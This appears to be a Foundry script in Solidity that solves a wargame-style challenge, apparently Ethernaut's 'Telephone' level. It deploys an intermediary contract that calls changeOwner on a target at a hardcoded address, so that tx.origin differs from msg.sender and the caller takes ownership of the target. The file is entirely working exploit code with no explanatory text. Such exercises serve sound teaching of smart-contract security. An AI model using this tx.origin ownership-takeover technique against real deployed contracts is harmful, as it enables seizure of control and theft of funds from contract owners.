/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Sender {
    function changeOwner(address _contract) public {
        ITelephone(_contract).changeOwner(tx.origin);
    }
}

contract Telephone is Script {
    function run() public {
        vm.startBroadcast();

        Sender sender = new Sender();
        sender.changeOwner(0xfc4816F0e03bc4d4f6d17021346d1Da3D9216260);

        vm.stopBroadcast();
    }
}
